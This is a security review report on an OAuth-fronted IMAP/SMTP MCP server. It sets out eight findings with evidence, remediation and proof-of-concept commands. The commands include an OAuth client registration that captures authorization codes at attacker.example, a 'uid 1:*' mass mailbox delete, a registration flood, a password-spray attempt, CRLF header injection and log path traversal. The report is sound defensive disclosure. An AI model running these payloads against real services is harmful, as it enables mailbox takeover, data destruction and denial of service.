# Security Review Report: IMAP/SMTP MCP

## Executive Summary

This review assessed `imap-smtp-mcp` as an internet-reachable MCP/OAuth service where an attacker can reach public HTTP endpoints but does not have source-code access. Source code was used only to confirm behavior, impact, and exploitability.

The most serious issue is the combination of unrestricted OAuth Dynamic Client Registration and an authorize page that does not identify the registered client or redirect destination. A remote attacker can register an attacker-controlled redirect URI, lure a user to the legitimate MCP authorize page, receive the authorization code, exchange it using the attacker's PKCE verifier, and obtain mailbox-backed MCP access and refresh tokens.

The second critical practical issue is that tools documented as operating on one IMAP UID accept arbitrary IMAP sequence sets such as `1:*`. With a valid `mail:write` token, this can turn a single-message delete, move, or read-state action into a bulk mailbox operation. Chained after the OAuth client attack, this becomes a realistic full mailbox compromise and destructive wipe path.

Several supporting issues increase real-world risk: destructive action flags default to enabled if env vars are omitted, unauthenticated client registration can grow the SQLite store indefinitely, `/oauth/authorize` acts as an IMAP password-spray oracle without local throttling, redirect URIs can carry CRLF into `Location`, and audit log filenames are derived from mailbox usernames without path normalization.

## Environment Metadata

- Repository: `/home/ha/projects/imap-smtp-mcp`
- Commit reviewed: `bb5ecaafd132cbc5ff6ed9851d6a0bc2304a8158`
- Investigation start: `2026-05-14T21:49:07-07:00`
- Report generated: `2026-05-14T21:53:47-07:00`
- Worktree before report creation: clean
- Assumed deployment: public HTTPS reverse proxy in front of the MCP HTTP server, as documented
- Attacker perspective: remote unauthenticated internet user unless a finding explicitly requires a bearer token

## Methodology

I reviewed the exposed OAuth and MCP HTTP surfaces, then traced security boundaries into the OAuth store, bearer-token validation, tool dispatch, IMAP/SMTP adapters, action flags, and audit logging. I prioritized issues that can be exploited remotely without source knowledge, and I rated them pragmatically using CVSS v3.1 based on real exploit preconditions.

Evidence references use repository line numbers from the reviewed commit.

## Findings Overview

| ID | Finding | Severity | CVSS v3.1 | Practical exploitability |
| --- | --- | --- | --- | --- |
| SR-001 | Unrestricted OAuth client registration enables token capture through attacker redirect | High | 8.8 | Remote, no auth, user interaction required |
| SR-002 | IMAP UID sequence-set injection enables bulk write/destructive actions | High | 8.1 | Requires bearer token; chains cleanly with SR-001 |
| SR-003 | Destructive action flags default to enabled when env vars are omitted | Medium | 6.7 | Depends on deployment omission plus bearer token |
| SR-004 | Unauthenticated client registration can exhaust persistent SQLite storage | High | 7.5 | Remote, no auth, repeated requests |
| SR-005 | OAuth authorize endpoint is an IMAP password-spray oracle without local throttling | Medium | 5.3 | Remote, no auth, depends on guessed credentials/upstream controls |
| SR-006 | Redirect URI validation permits CRLF response-header injection after authorization | Medium | 5.4 | Remote registration plus user authorization |
| SR-007 | Audit log filename uses untrusted subject and allows path traversal writes | Medium | 4.4 | Requires valid mailbox login with unusual username |
| SR-008 | OAuth/browser hardening gaps and malformed-input crashes | Low | 3.7 | Mostly hardening and robustness issues |

## SR-001: Unrestricted OAuth Client Registration Enables Token Capture

**Severity:** High  
**CVSS v3.1:** 8.8, `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`

### Evidence

`/oauth/register` is public and reaches `OAuthService.register_client()` without authentication (`src/imap_smtp_mcp/server.py:89-93`, `src/imap_smtp_mcp/server.py:108-113`). Registration accepts any string that starts with `https://` as a redirect URI and stores it as a valid OAuth client (`src/imap_smtp_mcp/oauth.py:407-423`). The authorize page validates only that the redirect URI matches the stored client (`src/imap_smtp_mcp/oauth.py:432-454`), then renders a generic "Authorize IMAP/SMTP MCP" page without displaying the client name or redirect URI (`src/imap_smtp_mcp/server.py:476-479`). After credential entry, the server redirects the authorization code to the registered redirect URI (`src/imap_smtp_mcp/oauth.py:496-510`, `src/imap_smtp_mcp/server.py:151-155`). Token exchange supports public clients with `token_endpoint_auth_methods_supported: ["none"]` (`src/imap_smtp_mcp/oauth.py:393-405`), and returns access plus refresh tokens (`src/imap_smtp_mcp/oauth.py:512-562`).

### Impact

An attacker does not need the victim's IMAP/SMTP password. They need only convince the victim to enter credentials into the legitimate MCP server's real authorize page. Because the attacker registered the redirect URI and controls the PKCE verifier, the attacker receives the code and exchanges it for bearer and refresh tokens. Those tokens allow mailbox read, send, and write operations for the scopes requested and granted.

This is not merely theoretical OAuth phishing. The authorize page is first-party and legitimate, so normal password-manager/domain checks will not protect the user from granting access to an attacker-owned OAuth client.

### Proof of Concept

Do not run this against real users. It demonstrates the attacker workflow using placeholders.

```bash
BASE="https://mail-mcp.example.com"
ATTACKER_CB="https://attacker.example/oauth/callback"

CLIENT_ID="$(
  curl -fsS -X POST "$BASE/oauth/register" \
    -H "Content-Type: application/json" \
    -d "{\"redirect_uris\":[\"$ATTACKER_CB\"],\"client_name\":\"ChatGPT\"}" |
  python3 -c 'import json,sys; print(json.load(sys.stdin)["client_id"])'
)"

VERIFIER="attacker-controlled-verifier-please-replace"
CHALLENGE="$(
  printf '%s' "$VERIFIER" |
  openssl dgst -binary -sha256 |
  openssl base64 -A |
  tr '+/' '-_' |
  tr -d '='
)"

python3 - <<PY
from urllib.parse import urlencode
base = "$BASE"
params = {
    "response_type": "code",
    "client_id": "$CLIENT_ID",
    "redirect_uri": "$ATTACKER_CB",
    "code_challenge": "$CHALLENGE",
    "code_challenge_method": "S256",
    "scope": "mail:read mail:send mail:write",
    "resource": "$BASE",
    "state": "attacker-state-1",
}
print(base + "/oauth/authorize?" + urlencode(params))
PY
```

After the victim completes the legitimate authorize form, the attacker's callback receives:

```text
https://attacker.example/oauth/callback?code=code-...&state=attacker-state-1
```

The attacker exchanges it:

```bash
curl -fsS -X POST "$BASE/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "grant_type=authorization_code" \
  --data-urlencode "client_id=$CLIENT_ID" \
  --data-urlencode "redirect_uri=$ATTACKER_CB" \
  --data-urlencode "code=$CODE_FROM_CALLBACK" \
  --data-urlencode "code_verifier=$VERIFIER"
```

### Remediation

- Restrict Dynamic Client Registration to known MCP clients, or require an operator-configured redirect allowlist.
- Display the registered client name, redirect host, requested scopes, and a strong warning when the redirect host is not an expected provider.
- Consider requiring explicit operator approval for new clients, especially in self-hosted deployments.
- Bind issued sessions to expected client identities and add revocation tooling for suspicious clients.

## SR-002: IMAP UID Sequence-Set Injection Enables Bulk Destructive Actions

**Severity:** High  
**CVSS v3.1:** 8.1, `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`

### Evidence

The MCP schemas describe `uid` as a string for single-message operations (`src/imap_smtp_mcp/tool_controller.py:74-97`). Tool dispatch forwards that string directly into write service calls (`src/imap_smtp_mcp/tool_controller.py:214-228`). The write service validates only that the UID is non-empty and single-line (`src/imap_smtp_mcp/write_tools.py:20-27`, `src/imap_smtp_mcp/write_tools.py:84-93`, `src/imap_smtp_mcp/write_tools.py:107-121`, `src/imap_smtp_mcp/write_tools.py:129-140`). It then passes the value into `client.uid()` as an IMAP UID set.

IMAP UID commands accept sequence sets such as `1:*`, `1,2,3`, and ranges. The preflight `_ensure_uid_exists()` also passes the same value to `UID FETCH`, so a range with at least one existing message can satisfy the check (`src/imap_smtp_mcp/write_tools.py:34-37`).

### Impact

A caller with `mail:write` can transform a single-message action into a folder-wide action:

- `delete_email_permanent` with `uid="1:*"` can mark every UID in the folder as deleted and expunge it.
- `move_email` or `move_to_trash` with `uid="1:*"` can move all messages in a folder.
- `mark_read_state` with `uid="1:*"` can mark all messages read or unread.

Standalone, this requires a valid bearer token. Chained after SR-001, it is a realistic destructive mailbox wipe path.

### Proof of Concept

These requests are destructive. Use only against a disposable test mailbox.

```bash
BASE="https://mail-mcp.example.com"
TOKEN="paste-valid-mail-write-token"

curl -fsS -X POST "$BASE/sse" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "jsonrpc":"2.0",
    "id":"uid-seq-delete",
    "method":"tools/call",
    "params":{
      "name":"delete_email_permanent",
      "arguments":{"folder":"INBOX","uid":"1:*"}
    }
  }'
```

Less destructive but still modifying:

```bash
curl -fsS -X POST "$BASE/sse" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "jsonrpc":"2.0",
    "id":"uid-seq-read",
    "method":"tools/call",
    "params":{
      "name":"mark_read_state",
      "arguments":{"folder":"INBOX","uid":"1:*","is_read":true}
    }
  }'
```

### Remediation

- Validate UIDs with a strict positive-integer regex such as `^[1-9][0-9]*$` for single-message tools.
- Add explicit separate bulk APIs if bulk operations are desired, with different names, warnings, scopes, and audit treatment.
- Add negative tests for `1:*`, `1,2`, `1:5`, `*`, whitespace, and signed/zero values across read and write tools.

## SR-003: Destructive Action Flags Default to Enabled

**Severity:** Medium  
**CVSS v3.1:** 6.7, `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H`

### Evidence

The code defaults every action flag to `True` when the corresponding environment variable is absent (`src/imap_smtp_mcp/config.py:255-270`). This includes destructive actions such as permanent deletion, emptying trash, folder deletion, and folder renaming. The sample `env.example` disables many risky operations, but that safety lives in example configuration, not fail-safe runtime defaults.

Action flags are enforced before network calls, which is good (`src/imap_smtp_mcp/write_tools.py:14-18`, `src/imap_smtp_mcp/read_tools.py:142-148`). The issue is the default posture.

### Impact

A deployment that forgets to define one or more `ACTION_*` variables silently enables high-risk behavior. This matters because ChatGPT-compatible clients and OAuth scopes may request broad `mail:write` access. Combined with SR-001 or token compromise, omitted env vars increase impact from read/send access to mailbox modification and deletion.

### Proof of Concept

This is a configuration behavior demonstration:

```bash
env -i \
  IMAP_HOST=imap.example.com IMAP_PORT=993 IMAP_MODE=ssl \
  SMTP_HOST=smtp.example.com SMTP_PORT=587 SMTP_MODE=starttls \
  IMAP_SENT_FOLDER=Sent IMAP_TRASH_FOLDER=Trash \
  AUDIT_LOG_DIR=/tmp/imap-smtp-audit \
  MCP_PUBLIC_BASE_URL=http://127.0.0.1:8000 \
  MCP_ALLOW_INSECURE_PUBLIC_URL=true \
  python3 - <<'PY'
from imap_smtp_mcp.config import load_config
cfg = load_config()
for name in ("delete_email_permanent", "empty_trash", "delete_folder"):
    print(name, cfg.action_flags[name])
PY
```

Expected output shows all listed destructive actions as `True`.

### Remediation

- Default destructive write flags to `False` in code.
- Fail startup unless every action flag is explicitly set in production mode.
- Add a `/readyz` or startup log summary that clearly lists effective action flags without exposing secrets.

## SR-004: Unauthenticated Client Registration Can Exhaust Persistent Storage

**Severity:** High  
**CVSS v3.1:** 7.5, `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

### Evidence

The public `/oauth/register` endpoint accepts unauthenticated JSON up to 1 MiB (`src/imap_smtp_mcp/server.py:24-27`, `src/imap_smtp_mcp/server.py:108-113`, `src/imap_smtp_mcp/server.py:234-259`). `register_client()` stores each client in SQLite with `INSERT OR REPLACE`, using a fresh random `client_id` per request (`src/imap_smtp_mcp/oauth.py:407-423`, `src/imap_smtp_mcp/oauth.py:252-257`). There is no local rate limit, client quota, deduplication, registration expiry, or cleanup for `oauth_clients`.

### Impact

A remote unauthenticated attacker can continuously create clients and grow `oauth.sqlite3` until disk exhaustion or service degradation. This is especially realistic for small self-hosted VPS/container volumes.

### Proof of Concept

This bounded loop demonstrates persistent growth without using real credentials:

```bash
BASE="https://mail-mcp.example.com"

python3 - <<'PY'
import json
import urllib.request

base = "https://mail-mcp.example.com"
payload = {
    "redirect_uris": ["https://attacker.example/cb"],
    "client_name": "A" * 500_000,
}
body = json.dumps(payload).encode()

for i in range(50):
    req = urllib.request.Request(
        base + "/oauth/register",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        print(i, resp.status)
PY
```

### Remediation

- Add rate limiting and request quotas at the application and reverse-proxy layers.
- Bound `client_name` and the number/length of redirect URIs.
- Expire unused dynamically registered clients or require an operator allowlist.
- Consider making DCR optional and disabled by default outside ChatGPT compatibility mode.

## SR-005: OAuth Authorize Endpoint Is an IMAP Password-Spray Oracle

**Severity:** Medium  
**CVSS v3.1:** 5.3, `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

### Evidence

Any remote attacker can register a client, load `/oauth/authorize`, receive a CSRF cookie and hidden form token, and submit arbitrary IMAP/SMTP username/password pairs (`src/imap_smtp_mcp/server.py:121-150`). The OAuth service verifies IMAP login before issuing a code (`src/imap_smtp_mcp/oauth.py:456-510`, `src/imap_smtp_mcp/oauth.py:631-638`). Failed logins return deterministic `access_denied` behavior.

There is no application-level throttling per source IP, username, client, or session. The CSRF cookie is query-bound but not time-bound server-side, and an attacker controlling their HTTP client can obtain and reuse it for repeated attempts.

### Impact

The MCP server can be abused as an internet-facing password-spray relay against the configured IMAP backend. In the best case, upstream IMAP lockout/rate limits absorb it. In the worst case, the attacker gets a reliable online oracle for valid mailbox credentials and may cause account lockouts.

### Proof of Concept

This shows one attempt. Repeating it at scale would be abusive and is intentionally not provided.

```bash
BASE="https://mail-mcp.example.com"
CLIENT_ID="registered-client-id"
AUTH_QUERY="response_type=code&client_id=$CLIENT_ID&redirect_uri=https%3A%2F%2Fattacker.example%2Fcb&code_challenge=CHALLENGE&code_challenge_method=S256&scope=mail%3Aread&resource=https%3A%2F%2Fmail-mcp.example.com"

curl -i -c /tmp/mcp-cookies.txt "$BASE/oauth/authorize?$AUTH_QUERY"

curl -i -b /tmp/mcp-cookies.txt -X POST "$BASE/oauth/authorize?$AUTH_QUERY" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "csrf_token=CSRF_TOKEN_FROM_FORM" \
  --data-urlencode "imap_username=victim@example.com" \
  --data-urlencode "imap_password=guessed-password" \
  --data-urlencode "smtp_username=victim@example.com" \
  --data-urlencode "smtp_password=anything" \
  --data-urlencode "sender_display_name=Victim" \
  --data-urlencode "sender_email=victim@example.com"
```

### Remediation

- Add local rate limits for authorize POST attempts by IP, username, and client ID.
- Consider proof-of-work, CAPTCHA, or operator allowlists if this remains internet-facing.
- Avoid retrying authentication failures in ways that amplify upstream lockout counters.
- Log and alert on repeated `oauth_authorize` failures without recording secrets.

## SR-006: Redirect URI CRLF Response-Header Injection

**Severity:** Medium  
**CVSS v3.1:** 5.4, `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`

### Evidence

Client registration accepts any redirect URI string beginning with `https://` (`src/imap_smtp_mcp/oauth.py:407-415`). It does not parse the URI, reject control characters, or require a valid host/path structure. The registered URI is later used to build the redirect response (`src/imap_smtp_mcp/oauth.py:509-510`), and the server writes it directly into a `Location` header (`src/imap_smtp_mcp/server.py:151-154`).

Python's `BaseHTTPRequestHandler.send_header()` does not sanitize CRLF in header values before formatting headers. Therefore, a redirect URI containing `%0D%0A` after decoding can inject response headers after successful authorization.

### Impact

This requires a malicious registered client and user authorization, so it is less important than SR-001. Still, it can enable header injection in the OAuth response, potentially affecting cookies, cache behavior, or downstream proxies. Because SR-001 already lets the attacker receive the authorization code, I rate this as medium rather than high.

### Proof of Concept

```bash
BASE="https://mail-mcp.example.com"

python3 - <<'PY'
import json
import urllib.parse

redirect = "https://attacker.example/cb\r\nX-MCP-PoC: injected"
print("registration JSON:")
print(json.dumps({"redirect_uris": [redirect], "client_name": "Header PoC"}))
print()
print("authorize redirect_uri parameter:")
print(urllib.parse.quote(redirect, safe=""))
PY
```

After a successful authorization using the matching encoded `redirect_uri`, the vulnerable response shape is:

```text
HTTP/1.0 302 Found
Location: https://attacker.example/cb
X-MCP-PoC: injected?code=code-...&state=...
```

### Remediation

- Parse redirect URIs with `urllib.parse.urlparse()` and require `scheme == "https"` and a non-empty hostname.
- Reject all ASCII control characters, spaces, backslashes, fragments, and userinfo in redirect URIs.
- Prefer constructing redirects through a safe response helper that validates header values before calling `send_header()`.

## SR-007: Audit Log Filename Path Traversal

**Severity:** Medium  
**CVSS v3.1:** 4.4, `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L`

### Evidence

Token subjects are the IMAP username captured during authorization (`src/imap_smtp_mcp/oauth.py:489-495`). Tool audit events pass that subject as `mcp_user` (`src/imap_smtp_mcp/tool_controller.py:160-167`, `src/imap_smtp_mcp/tool_controller.py:271-285`). `AuditLogger` directly uses `event.mcp_user` as a filename component: `self._log_dir / f"{username}.log"` (`src/imap_smtp_mcp/audit.py:42-76`).

There is no basename normalization or rejection of `/`, `\`, `..`, or path separators.

### Impact

If an attacker can authenticate with an IMAP username containing path traversal characters, audit writes can escape the configured audit directory and append JSON log lines to other writable paths. This is constrained by IMAP username policy and filesystem permissions, so it is not a universal remote file write. It is still a real bug: identity strings should never become filesystem paths without normalization.

### Proof of Concept

This local demonstration does not require a real IMAP account:

```python
from imap_smtp_mcp.audit import AuditEvent, AuditLogger

logger = AuditLogger("/tmp/mcp-audit")
logger.log_tool_invocation(
    AuditEvent(
        request_id="poc",
        mcp_user="../mcp-audit-escape",
        operation="list_folders",
        success=True,
    )
)

# Writes /tmp/mcp-audit/../mcp-audit-escape.log
```

### Remediation

- Use a stable encoded subject such as `base64url(sha256(subject))` for filenames.
- Store the original subject only inside the JSON payload.
- Ensure the resolved log path stays under `AUDIT_LOG_DIR` before opening.

## SR-008: OAuth/Browser Hardening Gaps and Malformed-Input Crashes

**Severity:** Low  
**CVSS v3.1:** 3.7, `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N`

### Evidence

The authorize form is a credential-entry page but `_send_html()` emits only `Content-Type` and `Content-Length` plus the CSRF cookie (`src/imap_smtp_mcp/server.py:269-277`). It does not set `Content-Security-Policy`, `frame-ancestors`, `X-Frame-Options`, `Referrer-Policy`, or `Cache-Control: no-store`.

Malformed JSON handling is inconsistent. `_handle_mcp_jsonrpc()` catches parse errors (`src/imap_smtp_mcp/server.py:176-184`), but `_handle_register()` does not catch `json.JSONDecodeError` from `_read_json()` (`src/imap_smtp_mcp/server.py:108-119`, `src/imap_smtp_mcp/server.py:234-240`). Token exchange can also raise unhandled exceptions for non-ASCII PKCE verifier values because `code_verifier` is encoded as ASCII without converting errors into OAuth errors (`src/imap_smtp_mcp/oauth.py:529-532`).

### Impact

The missing browser headers make clickjacking and referrer/caching mistakes easier around a sensitive credential form. The malformed-input crashes are mostly robustness and noisy-error issues, not direct compromise.

### Proof of Concept

Malformed registration body:

```bash
printf '{bad-json' | curl -i -X POST "https://mail-mcp.example.com/oauth/register" \
  -H "Content-Type: application/json" \
  --data-binary @-
```

Non-ASCII PKCE verifier with a valid, unredeemed authorization code:

```python
import urllib.error
import urllib.parse
import urllib.request

base = "https://mail-mcp.example.com"
body = urllib.parse.urlencode(
    {
        "grant_type": "authorization_code",
        "client_id": "client-placeholder",
        "redirect_uri": "https://attacker.example/cb",
        "code": "valid-code-placeholder",
        "code_verifier": "not-ascii-\u2603",
    }
).encode("ascii")

req = urllib.request.Request(
    base + "/oauth/token",
    data=body,
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    method="POST",
)
try:
    urllib.request.urlopen(req, timeout=10)
except urllib.error.HTTPError as exc:
    print(exc.status, exc.read().decode())
```

### Remediation

- Add `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'`.
- Add `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, and `Cache-Control: no-store` on OAuth pages.
- Convert malformed JSON and PKCE verifier errors into deterministic OAuth/JSON error responses.

## Positive Security Observations and Non-Issues

- Bearer tokens are HMAC-signed and signature, issuer, audience, expiry, required scopes, session ID, and subject are checked before tool calls (`src/imap_smtp_mcp/oauth.py:128-165`, `src/imap_smtp_mcp/oauth.py:614-629`).
- PKCE S256 is required for authorization-code exchange (`src/imap_smtp_mcp/oauth.py:442-445`, `src/imap_smtp_mcp/oauth.py:529-532`).
- Authorization codes are single-use and expire (`src/imap_smtp_mcp/oauth.py:521-533`).
- Refresh tokens are stored as keyed hashes, not plaintext (`src/imap_smtp_mcp/oauth.py:545-555`, `src/imap_smtp_mcp/oauth.py:611-612`).
- Mailbox credentials are encrypted at rest when `OAUTH_ENCRYPTION_KEY` is configured, and production HTTPS deployments fail fast if it is missing (`src/imap_smtp_mcp/config.py:183-189`, `src/imap_smtp_mcp/oauth.py:168-196`).
- IMAP and SMTP credentials are modeled separately (`src/imap_smtp_mcp/oauth.py:54-61`).
- Action flags are enforced before adapter/network calls once configuration is loaded (`src/imap_smtp_mcp/write_tools.py:14-18`, `src/imap_smtp_mcp/read_tools.py:142-148`).
- IMAP and SMTP TLS verification is enabled and required by configuration (`src/imap_smtp_mcp/config.py:244-246`).

## Realistic Attack Chain

1. Attacker registers an OAuth client with `redirect_uri=https://attacker.example/cb`.
2. Attacker sends the victim a legitimate MCP authorize URL using that client ID and broad scopes.
3. Victim enters IMAP and SMTP credentials into the real MCP authorize form.
4. MCP validates IMAP, stores encrypted credentials, issues an authorization code, and redirects to the attacker's URI.
5. Attacker exchanges the code using their PKCE verifier and obtains access plus refresh tokens.
6. Attacker reads mailbox contents, sends mail as the captured sender identity, and calls write tools.
7. If destructive flags are enabled and SR-002 is unfixed, attacker calls `delete_email_permanent` with `uid="1:*"` to wipe a folder.

This chain is realistic because it requires no source access, no prior account on the MCP server, and only normal user interaction with a legitimate-looking first-party OAuth page.

## Recommended Remediation Order

1. Restrict OAuth client registration and redirect URIs. This is the highest leverage fix.
2. Strictly validate UID inputs as single numeric UIDs before any IMAP UID command.
3. Change destructive action defaults to disabled and require explicit production configuration.
4. Add rate limiting and quotas to `/oauth/register` and `/oauth/authorize`.
5. Harden redirect URI parsing and sanitize all HTTP header values.
6. Normalize audit log filenames.
7. Add OAuth-page security headers and consistent malformed-input handling.

## Residual Risk

Even after these fixes, this project intentionally grants a remote MCP client powerful mailbox access. The operator should treat OAuth client approval, least-privilege scopes, action flags, audit retention, and quick token/session revocation as first-class operational controls. In particular, `mail:write` and destructive mailbox actions should be opt-in per deployment, not assumed safe because the caller is ChatGPT-compatible.
